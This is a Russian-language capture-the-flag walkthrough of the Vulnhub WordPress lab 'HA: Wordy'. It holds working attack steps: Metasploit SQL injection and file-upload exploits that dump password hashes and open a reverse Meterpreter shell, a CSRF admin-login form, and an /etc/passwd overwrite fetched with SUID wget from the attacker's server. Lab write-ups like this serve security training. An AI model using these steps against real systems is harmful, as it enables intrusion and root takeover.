# HA: Wordy
## Vulnhub machine

- Название: HA: Wordy  
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Beginning
- Дата релиза: 13.09.19
- Оригинальное описание: 
>Wordy is design for beginners to experience real life Penetration testing. This lab is completely dedicated to Web application testing and there are several vulnerabilities that should be exploited in multiple ways. Therefore, it is not only intended as a root challenge boot, the primary agenda is proactive in exploiting tops listed web application vulnerabilities. 
As this is a wordpress based lab, it is designed so that users can practice following vulnerabilities: - LFI - RFI - CSRF - File Upload - SQL
There is a total of 3 flags. Completion is only registered on exploiting all vulnerabilities and flags. 
Hint: “Everything is not what it seems to be.”
Visit our website http://hackingarticles.in

## Write-up

```html
root@kali:~# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:33:75:72, IPv4: 192.168.56.109
Starting arp-scan 1.9.6 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:31:64:19       PCS Systemtechnik GmbH
192.168.56.118  08:00:27:4c:14:42       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.6: 256 hosts scanned in 2.169 seconds (118.03 hosts/sec). 3 responded<br><br>root@kali:~# nmap -A 192.168.56.118
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 10:32 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.118
Host is up (0.00044s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:4C:14:42 (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Synology DiskStation Manager 5.2-5644 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.56.118
                                                                                
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                           
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

>Открыт только 80 порт, как и говорилось в описании – машина базируется на веб-уязвимостях.

```html
root@kali:~# dirb http://192.168.56.118/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar 25 10:34:16 2020
URL_BASE: http://192.168.56.118/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.118/ ----
+ http://192.168.56.118/index.html (CODE:200|SIZE:10918)                       
+ http://192.168.56.118/info.php (CODE:200|SIZE:14)                            
==> DIRECTORY: http://192.168.56.118/javascript/                               
+ http://192.168.56.118/server-status (CODE:403|SIZE:279)                      
==> DIRECTORY: http://192.168.56.118/wordpress/                                
                                                                               
---- Entering directory: http://192.168.56.118/javascript/ ----
==> DIRECTORY: http://192.168.56.118/javascript/jquery/                        
                                                                               
---- Entering directory: http://192.168.56.118/wordpress/ ----
+ http://192.168.56.118/wordpress/index.php (CODE:301|SIZE:0)                  
==> DIRECTORY: http://192.168.56.118/wordpress/wp-admin/                       
==> DIRECTORY: http://192.168.56.118/wordpress/wp-content/                     
==> DIRECTORY: http://192.168.56.118/wordpress/wp-includes/                    
+ http://192.168.56.118/wordpress/xmlrpc.php (CODE:405|SIZE:42)                
                                                                               
---- Entering directory: http://192.168.56.118/javascript/jquery/ ----
+ http://192.168.56.118/javascript/jquery/jquery (CODE:200|SIZE:268026)        
                                                                               
---- Entering directory: http://192.168.56.118/wordpress/wp-admin/ ----
+ http://192.168.56.118/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)         
==> DIRECTORY: http://192.168.56.118/wordpress/wp-admin/css/                   
==> DIRECTORY: http://192.168.56.118/wordpress/wp-admin/images/                
==> DIRECTORY: http://192.168.56.118/wordpress/wp-admin/includes/              
+ http://192.168.56.118/wordpress/wp-admin/index.php (CODE:302|SIZE:0)         
==> DIRECTORY: http://192.168.56.118/wordpress/wp-admin/js/                    
^Z> Testing: http://192.168.56.118/wordpress/wp-admin/ls                       
[2]+  Stopped                 dirb http://192.168.56.118/
```

>Как видно из скрина, на сервере развернут wordpress. В таком случае воспользуемся инструментом wpscan(результат сканирования намного больше предоставленного):

```html
root@kali:~# wpscan --url http://192.168.56.118/wordpress/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.118/wordpress/
[+] Started: Wed Mar 25 10:37:57 2020

Interesting Finding(s):

[+] http://192.168.56.118/wordpress/
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.118/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[i] Plugin(s) Identified:

[+] reflex-gallery
 | Location: http://192.168.56.118/wordpress/wp-content/plugins/reflex-gallery/
 | Last Updated: 2019-05-10T16:05:00.000Z
 | [!] The version is out of date, the latest version is 3.1.7
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.118/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[+] wp-symposium
 | Location: http://192.168.56.118/wordpress/wp-content/plugins/wp-symposium/
 | Last Updated: 2015-08-21T12:36:00.000Z
 | [!] The version is out of date, the latest version is 15.8.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 15.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.118/wordpress/wp-content/plugins/wp-symposium/readme.txt

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.

[+] Finished: Wed Mar 25 10:38:05 2020
[+] Requests Done: 67
[+] Cached Requests: 5
[+] Data Sent: 22.065 KB
[+] Data Received: 339.88 KB
[+] Memory used: 180.721 MB
[+] Elapsed time: 00:00:07
```

>Из всей полученной информации, самое интересное – это устаревшие плагины symposium и reflex-gallery, поищем информацию в metasploit:

```html
root@kali:~# msfconsole
[-] ***rTing the Metasploit Framework console...|
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  

         .                                         .                            
 .                                                                              
                                                                                
      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o               
       '   dB'                     BBP                                          
    dB'dB'dB' dBBP     dBP     dBP BB                                           
   dB'dB'dB' dBP      dBP     dBP  BB                                           
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB                                           
                                                                                
                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP 
          .                  .                  dB' dBP    dB'.BP               
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP     
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP      
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP       
                                                                                
                                                                    .           
                .                                                               
        o                  To boldly go where no                                
                            shell has gone before                               
                                                                                

       =[ metasploit v5.0.60-dev                          ]
+ -- --=[ 1947 exploits - 1089 auxiliary - 333 post       ]
+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search symposium

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  auxiliary/admin/http/wp_symposium_sql_injection  2015-08-18       normal     Yes    WordPress Symposium Plugin SQL Injection
   1  exploit/unix/webapp/wp_symposium_shell_upload    2014-12-11       excellent  Yes    WordPress WP Symposium 14.11 Shell Upload
```

>Найден эксплойт под уязвимый плагин wordpress с возможностью sql-инъекции.

```html
msf5 > use auxiliary/admin/http/wp_symposium_sql_injection
msf5 auxiliary(admin/http/wp_symposium_sql_injection) > set RHOSTS 192.168.56.118
RHOSTS => 192.168.56.118
msf5 auxiliary(admin/http/wp_symposium_sql_injection) > set TARGETURI /wordpressTARGETURI => /wordpress
msf5 auxiliary(admin/http/wp_symposium_sql_injection) > run
[*] Running module against 192.168.56.118

[+] 192.168.56.118:80 - admin           $P$BYWgfD7pa572QS9YFoeVVmhrIhBAx0. abc@gmail.com
[+] 192.168.56.118:80 -                                                    
[+] 192.168.56.118:80 - aarti           $P$BHyn.q5e5/HG9/UT/Ow3xkH2xXsikx0 aarti@gmail.com
[*] Auxiliary module execution completed
```

>Получены хэши пользователей, они понадобятся позже. Приступим ко второму плагину:

```html
msf5 auxiliary(admin/http/wp_symposium_sql_injection) > search reflexgallery

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability


msf5 auxiliary(admin/http/wp_symposium_sql_injection) > use exploit/unix/webapp/wp_reflexgallery_file_upload
msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS 192.168.56.118
RHOSTS => 192.168.56.118
msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > run

[*] Started reverse TCP handler on 192.168.56.109:4444 
[+] Our payload is at: kGelnSRAgudHy.php. Calling payload...
[*] Calling payload...
[*] Sending stage (38288 bytes) to 192.168.56.118
[*] Meterpreter session 1 opened (192.168.56.109:4444 -> 192.168.56.118:32828) at 2020-03-25 10:43:25 -0400
[+] Deleted kGelnSRAgudHy.php

meterpreter > shell
Process 1811 created.
Channel 0 created.
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>Уязвимый плагин позволяет загрузить произвольный файл на сервер и получить сеанс meterpreter, таким образом берем первый флаг.

```html
www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ cd //
cd //
www-data@ubuntu://$ cd home
cd home
www-data@ubuntu://home$ ls
ls
raj
www-data@ubuntu://home$ cd raj
cd raj
www-data@ubuntu://home/raj$ ls
ls
Desktop    Downloads  Pictures  Templates  examples.desktop  plugin
Documents  Music      Public    Videos     flag1.txt
www-data@ubuntu://home/raj$ cat flag1.txt
cat flag1.txt
aHR0cHM6Ly93d3cuaGFja2luZ2FydG**********
```

>При просмотре корневой директории был замечен интересный архив:

```html
www-data@ubuntu://var/www/html$ ls
ls
index.html  info.php  notes.txt  <mark>secret.zip</mark>  wordpress
www-data@ubuntu://var/www/html$ cat notes.txt
cat notes.txt
You Need to ZIP Your Wayout
```

>Скачаем его и разархивируем, пароль для архива оказался хэшем пользователя admin, который мы получили ранее:

```html
root@kali:~# wget http://192.168.56.118/secret.zip
--2020-03-25 10:53:19--  http://192.168.56.118/secret.zip
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 261 [application/zip]
Saving to: ‘secret.zip’

secret.zip          100%[===================>]     261  --.-KB/s    in 0s      

2020-03-25 10:53:19 (19.6 MB/s) - ‘secret.zip’ saved [261/261]

root@kali:~# unzip secret.zip
Archive:  secret.zip
[secret.zip] link.txt password: 
  inflating: link.txt                
root@kali:~# cat link.txt
https://www.exploit-db.com/exploits/38861
https://www.exploit-db.com/exploits/40290
https://www.exploit-db.com/exploits/36374
https://www.exploit-db.com/exploits/37824
https://www.exploit-db.com/exploits/41006
```

>Последняя ссылка из файла оказалась намеком для следующего шага, уязвимость связана с эскалацией через поддельный запрос. Таким образом, с помощью формы из ссылки, мы входим в панель администратора зная только имя пользователя. Ниже HTML код формы, закрой теги чтобы юзать.

```html
form method="post" actions="http://192.168.56.118/wordpress/wp-admin/admin-ajax.php"
	Username: input type="text" name="username" value="admin"
		input type="hidden" name="email" value="sth"
		input type="hidden" name="action" value="loginGuestFacebook"
		input type="submit" value="Login"
	form
```

>Открываем форму в браузере и жмем кнопку, после нескольких попыток все таки сработал редирект и открылась пустая страница, переходим в верхнюю директорию и попадаем в панель администратора, заходим User -> Edit и берем второй флаг:

```html
Biographical Info:

Second Flag: 5DD1CC591CE1569A528E3B**********
RootPassword: SWduaXRlQDEyMw==
```

>Вернемся к консоли и просмотрим разрешения, которые предоставлены www-data:

```html
www-data@ubuntu://$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/arping
/usr/bin/wget
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/cp
/bin/su
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
```

>Попробуем подменить файл passwd, для этого создадим на своей машине нового пользователя с помощью openssl. Имя - testuser, пароль - password:

```html
root@kali:~# openssl passwd -1 -salt testuser password
$1$testuser$lF4oCT8sao5vPDO2xzMXD1
```

>Далее откроем файл passwd, скопируем все содержимое в новый файл и добавим в конце заранее созданного пользователя testuser. По типу «имя юзера» + «:» + «хэш полученный с помощью openssl» + «:» + «root права». Должно получиться:

```html
testuser:$1$testuser$lF4oCT8sao5vPDO2xzMXD1:0:0:root:/root:/bin/bash
```

>Далее запустим http сервер на основной машине:

```html
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

>И запросим файл passwd с флагом на замену исходного файла:

```html
www-data@ubuntu://etc$ wget -O passwd http://192.168.56.109:8000/passwd
wget -O passwd http://192.168.56.109:8000/passwd
--2020-03-25 08:11:59--  http://192.168.56.109:8000/passwd
Connecting to 192.168.56.109:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2569 (2.5K) [application/octet-stream]
Saving to: 'passwd'

passwd              100%[===================>]   2.51K  --.-KB/s    in 0s      

2020-03-25 08:11:59 (100 MB/s) - 'passwd' saved [2569/2569]
```

>Теперь остается только войти под testuser и взять последний флаг:

```html
www-data@ubuntu://etc$ su testuser
su testuser
Password: password

root@ubuntu://etc# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu://etc# cd //
cd //
root@ubuntu://# cd root
cd root
root@ubuntu://root# ls
ls
proof.txt
root@ubuntu://root# cat proof.txt
cat proof.txt
_________________________________________________________________________
 _____     _   _   U _____ u     U _____ u   _   _       ____           |
 |_ " _|   |'| |'|  \| ___"|/     \| ___"|/  | \ |"|     |  _"\         |
   | |    /| |_| |\  |  _|"        |  _|"   <|  \| |>   /| | | |        |
  /| |\   U|  _  |u  | |___        | |___   U| |\  |u   U| |_| |\       |
 u |_|U    |_| |_|   |_____|       |_____|   |_| \_|     |____/ u       |
 _// \\_   //   \\   <<   >>       <<   >>   ||   \\,-.   |||_          |
(__) (__) (_") ("_) (__) (__)     (__) (__)  (_")  (_/   (__)_)         |
                                                                        |
                                                                        |
!! Congrats you have finished this task !!                              |
                                                                        |
Contact us here:                                                        |
                                                                        |
Hacking Articles : https://twitter.com/rajchandel/                      |
                                                                        |
                                                                        |
+-+-+-+-+-+ +-+-+-+-+-+-+-+                                             |
 |E|n|j|o|y| |H|A|C|K|I|N|G|                                            |
 +-+-+-+-+-+ +-+-+-+-+-+-+-+                                            |
________________________________________________________________________|
```












